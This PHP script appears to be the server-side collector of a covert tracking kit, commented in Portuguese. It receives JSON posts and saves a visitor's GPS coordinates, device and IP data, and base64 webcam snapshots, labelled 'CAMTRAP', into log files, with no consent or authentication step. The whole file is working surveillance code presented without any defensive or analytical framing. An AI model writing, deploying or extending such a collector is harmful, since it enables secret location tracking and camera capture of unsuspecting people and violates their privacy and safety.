<?php
header('Content-Type: application/json');
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $logDir = '../../logs/';
    
    // 1. DADOS DE GPS
    if (isset($data['lat'])) {
        $file = $logDir . 'result.txt';
        $json = json_encode(['status' => 'success', 'lat' => $data['lat'], 'lon' => $data['lon'], 'acc' => $data['acc']]);
        file_put_contents($file, $json);
    } 
    // 2. DADOS DE DISPOSITIVO
    elseif (isset($data['ip'])) {
        $file = $logDir . 'info.txt';
        file_put_contents($file, json_encode($data));
    } 
    // 3. IMAGEM (CAMTRAP)
    elseif (isset($data['img'])) {
        $img = $data['img'];
        $img = str_replace('data:image/png;base64,', '', $img);
        $img = str_replace(' ', '+', $img);
        $data = base64_decode($img);
        $file = $logDir . 'cam_' . date('Ymd_His') . '.png';
        file_put_contents($file, $data);
    }
}
?>